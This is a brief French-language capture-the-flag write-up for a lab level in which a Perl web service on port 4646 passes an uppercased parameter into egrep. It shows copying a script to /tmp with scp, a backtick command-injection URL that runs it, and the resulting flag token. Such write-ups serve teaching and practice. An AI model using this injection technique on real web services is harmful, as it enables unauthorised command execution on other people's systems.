dans ~ de level12 & /var/www on trouve level12.pl
level12.pl c'est un serveur web qui ecoute sur le port 4646 (comme le level04)
il prend 2 paramatre x & y
x est mis en maj par une regex
x est utiliser pour faire un egrep (grep d'un partern, regex) dans /tmp
il suffit de scp un script dont le nom est MAJ et l'appeler via x comme dans le level04

scp -P 4242 SCRIPT level12@192.168.56.101:/tmp/

http://192.168.56.101:4646/?x=`/*/script`

~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
